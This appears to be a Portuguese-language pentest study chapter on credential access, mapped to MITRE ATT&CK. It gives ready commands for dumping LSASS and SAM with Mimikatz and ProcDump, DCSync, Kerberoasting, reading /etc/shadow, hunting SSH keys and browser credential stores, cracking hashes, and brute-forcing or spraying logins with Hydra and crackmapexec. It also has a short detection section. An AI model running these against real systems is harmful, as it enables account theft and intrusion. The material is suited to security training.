# 08 - Acesso a Credenciais

**MITRE ATT&CK Tactic:** [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006/)

## 📖 Sobre

Técnicas para **roubar credenciais** como senhas, hashes, tickets Kerberos, tokens, chaves SSH, etc. Essencial para lateral movement e escalação.

## 🎯 Objetivo

Obter credenciais válidas que permitam acesso a outros sistemas, contas privilegiadas ou persistência.

## 📚 Técnicas Principais

### T1003 - OS Credential Dumping
- **T1003.001** - LSASS Memory (Mimikatz, ProcDump)
- **T1003.002** - Security Account Manager (SAM)
- **T1003.003** - NTDS (Active Directory)
- **T1003.004** - LSA Secrets
- **T1003.005** - Cached Domain Credentials
- **T1003.006** - DCSync
- **T1003.008** - /etc/passwd and /etc/shadow

### T1110 - Brute Force
- **T1110.001** - Password Guessing
- **T1110.002** - Password Cracking
- **T1110.003** - Password Spraying
- **T1110.004** - Credential Stuffing

### T1555 - Credentials from Password Stores
- **T1555.001** - Keychain
- **T1555.003** - Credentials from Web Browsers
- **T1555.004** - Windows Credential Manager
- Password managers

### T1056 - Input Capture
- **T1056.001** - Keylogging
- **T1056.002** - GUI Input Capture

### T1552 - Unsecured Credentials
- **T1552.001** - Credentials In Files
- **T1552.004** - Private Keys
- **T1552.006** - Group Policy Preferences (GPP)
- Hardcoded passwords

### T1558 - Steal or Forge Kerberos Tickets
- **T1558.003** - Kerberoasting
- **T1558.004** - AS-REP Roasting
- Golden/Silver Tickets

## 🛠️ Técnicas por Sistema

### Windows Credential Dumping

#### LSASS Memory Dump
```powershell
# Mimikatz - O clássico
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# ProcDump (evitar detecção)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Task Manager
# Processo lsass.exe -> Create dump file
# Depois: mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

#### SAM Database
```powershell
# Copiar SAM (requer SYSTEM)
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save

# Extrair hashes (no Kali)
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

#### DCSync Attack
```powershell
# Mimikatz - Replicar AD (requer permissões)
lsadump::dcsync /domain:corp.com /user:Administrator
```

#### Kerberoasting
```powershell
# Impacket
impacket-GetUserSPNs -request -dc-ip DC_IP domain/user:password

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# PowerShell
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

### Linux Credential Access

#### /etc/shadow
```bash
# Copiar shadow (requer root)
cat /etc/shadow

# Unshadow para cracking
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

#### SSH Keys
```bash
# Procurar chaves privadas
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Usar chave encontrada
chmod 600 id_rsa
ssh -i id_rsa user@target
```

#### Browser Credentials
```bash
# Firefox
~/.mozilla/firefox/*.default/logins.json
~/.mozilla/firefox/*.default/key4.db

# Chrome
~/.config/google-chrome/Default/Login Data
```

#### Memory Dump
```bash
# Mimipenguin - Linux password dumper
./mimipenguin.sh

# Process memory dump
gcore -o output PID
strings output.* | grep -i pass
```

### Password Cracking

#### John the Ripper
```bash
# Wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Incremental mode
john --incremental hashes.txt

# Show cracked
john --show hashes.txt
```

#### Hashcat
```bash
# NTLM hashes (mode 1000)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# NetNTLMv2 (mode 5600)
hashcat -m 5600 -a 0 hashes.txt rockyou.txt

# Kerberos TGS (mode 13100)
hashcat -m 13100 -a 0 kerberos.txt rockyou.txt

# Rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Brute Force Attacks

#### Hydra
```bash
# SSH brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP

# HTTP POST login
hydra -l admin -P passwords.txt TARGET_IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P passwords.txt rdp://TARGET_IP
```

#### Password Spraying
```bash
# Crackmapexec - SMB password spray
crackmapexec smb TARGET_IP -u users.txt -p 'Password123' --continue-on-success

# Kerbrute - Domain password spray
kerbrute passwordspray -d domain.local users.txt 'Password123'
```

### Browser Credentials

#### LaZagne (Multi-platform)
```bash
# Windows
laZagne.exe all

# Linux
python laZagne.py all
```

#### Manual Extraction
```powershell
# Chrome/Edge - Windows
# SQLite database: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox
# logins.json + key4.db (encrypted)
```

## 🎓 Labs Práticos

### Windows
- [ ] Dump LSASS com Mimikatz
- [ ] Extrair SAM database
- [ ] Kerberoasting attack
- [ ] Pass-the-Hash attack
- [ ] Crack NTLM hashes com Hashcat

### Linux
- [ ] Extrair /etc/shadow e crack com John
- [ ] Procurar SSH keys privadas
- [ ] Dump browser passwords com LaZagne
- [ ] Brute force SSH com Hydra

### Active Directory
- [ ] DCSync attack
- [ ] AS-REP Roasting
- [ ] Password spraying
- [ ] Golden Ticket attack

## 🛠️ Ferramentas Essenciais

### Dumping
- **Mimikatz** - Windows credential dumper
- **ProcDump** - Process dumping
- **Impacket** - Python AD tools (secretsdump)
- **LaZagne** - Multi-platform password recovery
- **mimipenguin** - Linux password dumper

### Cracking
- **John the Ripper** - Password cracker
- **Hashcat** - GPU password cracker
- **Hydra** - Network login cracker
- **Medusa** - Parallel brute forcer

### Kerberos Attacks
- **Rubeus** - Kerberos abuse toolkit
- **Impacket** - GetUserSPNs, GetNPUsers
- **Kerbrute** - Kerberos pre-auth bruteforcing

### Analysis
- **CrackMapExec** - SMB/AD pentesting
- **BloodHound** - AD attack paths
- **SharpHound** - BloodHound collector

## 📝 Hash Types
```
MD5:      098f6bcd4621d373cade4e832627b4f6
SHA1:     a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
NTLM:     8846f7eaee8fb117ad06bdd830b7586c
NTLMv2:   admin::DOMAIN:hash:hash:hash
Kerberos: $krb5tgs$23$*user$realm$spn*$hash
bcrypt:   $2a$10$N9qo8uLOickgx2ZMRZoMye
```

## 🔍 Detecção

### Indicadores
- Múltiplas falhas de autenticação
- Acesso incomum ao LSASS
- Tentativas de acesso a SAM/NTDS
- Kerberos TGS requests incomuns (Kerberoasting)
- DCSync traffic
- Export de certificados
- Processos suspeitos (Mimikatz, ProcDump)

### Proteções
- **LSAPS Protection** - Protected Process Light
- **Credential Guard** - Virtualization-based security
- **Strong passwords** - Complexidade + comprimento
- **MFA** - Multi-factor authentication
- **Monitor privileged accounts**

## 📚 Recursos

- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [PayloadsAllTheThings - Credentials](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
- [HackTricks - Credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials)

---

**Anterior:** [07-EvasaoDefesa](../07-EvasaoDefesa/) | **Próximo:** [09-Descoberta](../09-Descoberta/)